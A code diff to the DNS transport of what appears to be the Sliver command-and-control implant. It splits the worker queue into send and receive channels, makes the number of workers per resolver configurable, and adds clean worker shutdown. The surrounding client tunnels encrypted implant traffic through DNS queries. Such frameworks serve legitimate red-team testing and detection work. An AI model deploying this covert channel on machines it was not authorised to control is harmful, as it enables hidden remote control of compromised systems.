@@ -77,9 +77,10 @@ import (
 
 const (
 	// Little endian
-	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
-	metricsMaxSize   = 8
-	queueBufSize     = 512
+	sessionIDBitMask          = 0x00ffffff // Bitwise mask to get the dns session ID
+	metricsMaxSize            = 8
+	queueBufSize              = 1024
+	defaultWorkersPerResolver = 8
 )
 
 var (
@@ -118,9 +119,10 @@ func NewDNSClient(parent string, timeout time.Duration, retryWait time.Duration)
 		retryCount:   3,
 		closed:       true,
 
-		subdataSpace: 254 - len(parent) - (1 + (254-len(parent))/64),
-		base32:       encoders.Base32{},
-		base58:       encoders.Base58{},
+		WorkersPerResolver: defaultWorkersPerResolver,
+		subdataSpace:       254 - len(parent) - (1 + (254-len(parent))/64),
+		base32:             encoders.Base32{},
+		base58:             encoders.Base58{},
 	}
 }
 
@@ -140,9 +142,11 @@ type SliverDNSClient struct {
 	msgCount     uint32
 	closed       bool
 
-	cipherCtx  *cryptography.CipherContext
-	queue      chan *DNSWork
-	workerPool []*DNSWorker
+	cipherCtx          *cryptography.CipherContext
+	recvQueue          chan *DNSWork
+	sendQueue          chan *DNSWork
+	workerPool         []*DNSWorker
+	WorkersPerResolver int
 
 	base32 encoders.Base32
 	base58 encoders.Base58
@@ -168,15 +172,24 @@ type DNSResult struct {
 type DNSWorker struct {
 	resolver DNSResolver
 	Metadata *ResolverMetadata
+	Ctrl     chan struct{}
 }
 
 // Start - Starts with worker with a given queue
-func (w *DNSWorker) Start(id int, queue <-chan *DNSWork) {
+func (w *DNSWorker) Start(id int, recvQueue <-chan *DNSWork, sendQueue <-chan *DNSWork) {
 	go func() {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] starting worker #%d", id)
 		// {{end}}
-		for work := range queue {
+
+		for {
+			var work *DNSWork
+			select {
+			case work = <-recvQueue:
+			case work = <-sendQueue:
+			case <-w.Ctrl:
+				return
+			}
 			var data []byte
 			var err error
 
@@ -292,17 +305,19 @@ func (s *SliverDNSClient) SessionInit() error {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] starting worker(s) ...")
 	// {{end}}
-	s.queue = make(chan *DNSWork, queueBufSize)
+	s.recvQueue = make(chan *DNSWork, queueBufSize)
+	s.sendQueue = make(chan *DNSWork, queueBufSize)
 
 	// Workers per-resolver
-	for i := 0; i < 2; i++ {
+	for i := 0; i < s.WorkersPerResolver; i++ {
 		for id, resolver := range s.resolvers {
 			worker := &DNSWorker{
 				resolver: resolver,
 				Metadata: s.metadata[resolver.Address()],
+				Ctrl:     make(chan struct{}),
 			}
 			s.workerPool = append(s.workerPool, worker)
-			worker.Start(id, s.queue)
+			worker.Start(id, s.recvQueue, s.sendQueue)
 		}
 	}
 
@@ -405,7 +420,11 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 // Close - Close the dns session
 func (s *SliverDNSClient) Close() error {
 	s.closed = true
-	close(s.queue)
+	for _, worker := range s.workerPool {
+		worker.Ctrl <- struct{}{}
+	}
+	close(s.recvQueue)
+	close(s.sendQueue)
 	return nil
 }
 
@@ -431,7 +450,7 @@ func (s *SliverDNSClient) parallelSend(data []byte) error {
 	wg := &sync.WaitGroup{}
 	for _, domain := range domains {
 		wg.Add(1)
-		s.queue <- &DNSWork{
+		s.sendQueue <- &DNSWork{
 			QueryType: dns.TypeA,
 			Domain:    domain,
 			Wg:        wg,
@@ -472,7 +491,7 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 		}
 
 		wg.Add(1)
-		s.queue <- &DNSWork{
+		s.recvQueue <- &DNSWork{
 			QueryType: dns.TypeTXT,
 			Domain:    domain,
 			Wg:        wg,
